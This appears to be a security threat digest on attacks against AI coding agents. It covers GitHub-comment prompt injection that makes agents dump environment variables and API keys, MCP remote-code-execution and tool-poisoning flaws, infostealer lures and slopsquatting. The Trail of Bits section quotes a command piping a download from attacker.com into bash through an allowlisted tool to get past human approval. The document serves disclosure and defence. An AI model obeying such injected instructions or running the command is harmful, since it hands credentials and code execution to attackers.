### "Comment and Control" — Cross-Vendor Prompt Injection via GitHub Comments

**Researcher:** Aonan Guan | **Disclosed:** April 2026 | **Status:** Patched; bug bounties paid | **CVSS:** 9.4 (Anthropic classification)

A new prompt injection class dubbed **Comment and Control** weaponizes GitHub pull request titles, issue bodies, and issue comments to hijack AI coding agents running in GitHub Actions CI workflows. Three widely deployed agents were confirmed vulnerable: Anthropic Claude Code Security Review, Google Gemini CLI Action, and GitHub Copilot Agent (SWE Agent).

The attack is **zero-interaction from the victim**: GitHub Actions auto-trigger on `pull_request`, `issues`, and `issue_comment` events, meaning opening a PR or filing an issue activates the agent. The entire attack loop runs within GitHub itself — no external server required.

**Attack mechanics by vendor:**

- **Claude Code**: Malicious PR title breaks out of prompt context, instructs Claude to run `env`, and the credential dump is posted back as a JSON "security finding" in the PR comment.
- **Gemini CLI**: Attacker injects a fake "Trusted Content Section" that overrides safety instructions; Gemini posts `GEMINI_API_KEY` as a public issue comment.
- **GitHub Copilot**: Payload hidden inside an HTML comment in the issue body — invisible in GitHub's rendered Markdown but fully parsed by the AI agent.

**Bug bounties:** Anthropic ($100), Google ($1,337), GitHub ($500).

One vendor's system card had previously described this attack scenario in abstract terms; the research team noted it was "predicted but not prevented."

Sources: [SecurityWeek](https://www.securityweek.com/claude-code-gemini-cli-github-copilot-agents-vulnerable-to-prompt-injection-via-comments/) | [Aonan Guan (researcher)](https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/) | [VentureBeat](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) | [The Register](https://www.theregister.com/2026/04/15/claude_gemini_copilot_agents_hijacked/)

### Codex, Claude Code, and Copilot Breached — Credential-Focused Attack Pattern

**Reported:** April 30, 2026 | **Status:** Ongoing pattern

A VentureBeat investigation covering a nine-month streak of AI coding agent compromises found a consistent attacker playbook: **every exploit targeted the credential the agent was holding, not the AI model itself**. Affected tools include OpenAI Codex, Anthropic Claude Code, and GitHub Copilot.

Key findings:
- Attackers pivoted immediately from prompt injection to IAM credential harvest — API keys, AWS tokens, and GitHub tokens held by CI agents were the primary target.
- Six distinct exploits were documented; none relied on model jailbreaking. All exploited over-permissioned agent runtime identities.
- IAM teams frequently did not detect lateral movement initiated by stolen agent credentials, as the tokens appeared legitimate.

**Related — Claude Code Source Code Leak (April 1, 2026):** Anthropic inadvertently exposed ~512,000 lines of internal TypeScript via a misconfigured npm package. Threat actors pivoted within 24 hours to distribute infostealer payloads impersonating "leaked" Claude Code downloads.

### Anthropic MCP Design Vulnerability — Systemic RCE Across AI Supply Chain

**Researcher:** OX Security | **Disclosed:** April 16–20, 2026 | **Status:** Unpatched by Anthropic; partial vendor patches

OX Security disclosed a **systemic architectural flaw** in Anthropic's Model Context Protocol (MCP) SDK that enables remote code execution across all officially supported language SDKs (Python, TypeScript, Java, Rust). The flaw stems from how the STDIO interface handles command execution: any invocation that successfully creates a STDIO server executes the underlying OS command before returning an error on failure.

**Scale:** 7,000+ publicly accessible servers, 200,000 potentially vulnerable instances, 150 million total downloads affected.

**Affected downstream projects:** LiteLLM, LangChain, LangFlow, Flowise, LettaAI, LangBot, and others that build on the Anthropic MCP SDK inherit the exposure without modification.

**Anthropic's response:** Declined to modify the protocol's architecture, characterizing the behavior as "expected by design." Input sanitization responsibility shifted to downstream developers.

Related CVEs (downstream implementations):

### Trend Micro — Active Infostealer Campaigns Targeting Claude Code Users

**Reported:** April 2026 | **Status:** Active

Trend Micro documented active campaigns using Claude Code as a social engineering lure:

1. **Packaging error campaign:** Threat actors distributed malicious installers mimicking Claude Code's legitimate npm package, capitalizing on the April 2026 source code leak. Payloads included infostealers targeting `.env` files, SSH keys, and browser credential stores.
2. **GitHub Release payload abuse:** Attackers uploaded trojanized "Claude Code plugins" to GitHub Releases, exploiting the trust signals GitHub's UI provides (verified checkmarks, release notes).

Defenders advised to verify package integrity via npm provenance attestations and to audit `PATH` and shell configuration for unexpected Claude Code-adjacent binaries.

## Supply Chain

### Slopsquatting — Confirmed Real-World Exploitation Expanding

**Status:** Confirmed exploitation; no major attributed breach yet

AI package hallucination attacks (slopsquatting) continue to expand as a confirmed real-world threat class. Key updated statistics:

- ~20% of 576,000 generated Python/JavaScript samples recommended nonexistent packages
- Open-source LLMs hallucinate at ~21.7%; commercial models (GPT-4) at ~5%
- **43% of hallucinated packages repeat across 10 independent queries** — hallucinations are targetable and predictable
- AI-assisted commits expose secrets at **twice the rate** of human-written code (3.2% vs. 1.5%)

**January 2026:** Aikido researcher Charlie Eriksen documented `react-codeshift` spreading through real AI agent infrastructure, with agents autonomously attempting installs. **This is the first documented case of an agent self-propagating a slopsquatted package.**

**Methodology:** Attackers monitor consistent hallucinations, register the package name on npm/PyPI with post-install scripts that steal API keys and cloud tokens from the environment, and wait for developer or agent installs.

Sources: [Bleeping Computer](https://www.bleepingcomputer.com/news/security/ai-hallucinated-code-dependencies-become-new-supply-chain-risk/) | [Snyk — Slopsquatting](https://snyk.io/articles/slopsquatting-mitigation-strategies/) | [DevOps.com](https://devops.com/ai-generated-code-packages-can-lead-to-slopsquatting-threat-2/) | [NeuralTrust](https://neuraltrust.ai/blog/ai-driven-supply-chain-attacks)

## Research & Advisories

### Trail of Bits — Prompt Injection → Argument Injection → RCE (Ongoing)

**Published:** October 2025 | **Status:** Unresolved architectural class

Trail of Bits' documented attack pattern remains unaddressed as a class: pre-approved agent commands are not validated for argument flags, enabling argument injection that bypasses human-in-the-loop (HITL) approval:

- `go test -exec "curl attacker.com | bash"` — executes because `go test` is allowlisted
- `git show`, `ripgrep` — no argument restrictions

Payloads work when embedded in code comments, `.cursorrules`, GitHub content, and log output. This remains a structural gap across all major coding agents.

Source: [Trail of Bits](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)

### MCP Ecosystem Security — Updated Survey

An analysis of 67,057 MCP servers across 6 public registries found:

- **43%** have OAuth authentication flaws
- **43%** contain command injection vulnerabilities
- **33%** allow unrestricted network access
- **22%** allow file access outside intended data sources
- **5%** of open-source MCP servers actively seeded with tool poisoning

**Rug Pull / Tool Poisoning:** MCP tools can silently mutate their definitions after user approval. A benign tool on Day 1 can redirect API keys to an attacker by Day 7; traditional security tooling does not monitor changes to MCP tool descriptions.

**MCPJam Inspector (CVE-2026-23744, CVSS 9.8):** Unauthenticated RCE via 0.0.0.0 bind in the inspector proxy. Binds to all interfaces; a developer inspecting a malicious MCP server executes attacker-controlled commands locally. Status: **no fix available**.

## Key Structural Findings (May 2026)

1. **Credential theft has overtaken model exploitation as the primary attack goal.** Every documented multi-stage AI coding agent breach in the past nine months ended with IAM credential harvest, not model abuse.
2. **Comment and Control establishes GitHub comments as a first-class attack surface.** Any AI agent triggered by GitHub webhooks and reading issue/PR content is vulnerable without additional prompt hardening.
3. **The MCP architectural RCE is unpatched at the protocol level.** Anthropic has declined to fix the STDIO design; 200,000 servers remain exposed, and downstream developers must independently implement mitigations.
4. **Vibe coding is generating a measurable CVE acceleration curve** — AI-attributed CVEs nearly sextupled between January and March 2026, with no indication of deceleration.
5. **Slopsquatting has crossed from theoretical to operational** — AI agents are now documented autonomously propagating hallucinated malicious packages without human initiation.
6. **MCPJam Inspector (CVE-2026-23744, CVSS 9.8) remains unpatched** — a critical 0-day for any developer using the MCP Inspector toolchain.
